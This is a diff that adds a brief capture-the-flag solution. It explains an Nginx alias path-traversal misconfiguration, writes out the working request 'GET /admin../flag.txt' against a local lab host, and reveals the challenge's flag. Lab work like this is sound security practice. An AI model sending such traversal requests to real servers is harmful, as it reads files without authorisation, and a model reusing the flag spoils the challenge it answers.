@@ -1,0 +1,4 @@
+# Nginx alias path traversal: location /admin without trailing slash + alias directive allows /admin../ to traverse to parent directory. Exposes /var/www/flag.txt containing the CTF flag: flag{9c29301f-3fea-47b5-924d-413607e3db56}
+
+GET /admin../flag.txt HTTP/1.1
+Host: 172.17.0.1:45765
